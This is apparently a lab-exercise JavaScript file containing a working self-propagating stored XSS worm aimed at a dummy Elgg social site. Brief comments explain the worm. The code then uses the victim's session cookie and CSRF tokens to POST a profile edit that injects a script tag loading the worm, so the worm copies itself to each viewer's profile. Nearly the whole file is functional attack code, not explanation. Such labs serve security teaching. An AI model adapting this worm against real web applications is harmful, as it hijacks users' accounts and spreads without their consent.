//A dummy social networking site www.xsslabelgg.com was used to perform a stored XSS attack in this case. 
//The aim was to create a self replicating XSS worm. 
//On accessing an infected page the script would generate a POST request that would copy the script to a field on the user's profile  
//page.  
//The next time someone else tried to access this user's profile their page would get infected as well and the cycle would continue.

var Ajax=null;
var scripttext = escape("<script type=\"text/javascript\" src=\"http://www.xsslabelgg.com/wormscript1.js\"></script>");
Ajax=new XMLHttpRequest();
Ajax.open("POST","http://www.xsslabelgg.com/action/profile/edit HTTP/1.1",true);
Ajax.setRequestHeader("Host","www.xsslabelgg.com");
Ajax.setRequestHeader("User-Agent","Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:23.0) Gecko/20100101 Firefox/23.0");
Ajax.setRequestHeader("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
Ajax.setRequestHeader("Accept-Language","en-US,en;q=0.5");
Ajax.setRequestHeader("Accept-Encoding","gzip, deflate");
Ajax.setRequestHeader("Referer","http://www.xsslabelgg.com/profile/alice/edit");
Ajax.setRequestHeader("Cookie",document.cookie);
Ajax.setRequestHeader("Connection","keep-alive");
Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
Ajax.setRequestHeader("Content-Length","498");
var content="__elgg_token="+elgg.security.token.__elgg_token+"&__elgg_ts="+elgg.security.token.__elgg_ts+"&name=Alice&description="+scripttext+"&accesslevel%5Bdescription%5D=2&briefdescription=&accesslevel%5Bbriefdescription%5D=2&location=&accesslevel%5Blocation%5D=2&interests=&accesslevel%5Binterests%5D=2&skills=&accesslevel%5Bskills%5D=2&contactemail=&accesslevel%5Bcontactemail%5D=2&phone=&accesslevel%5Bphone%5D=2&mobile=&accesslevel%5Bmobile%5D=2&website=&accesslevel%5Bwebsite%5D=2&twitter=&accesslevel%5Btwitter%5D=2&guid="+elgg.session.user.guid;
Ajax.send(content);


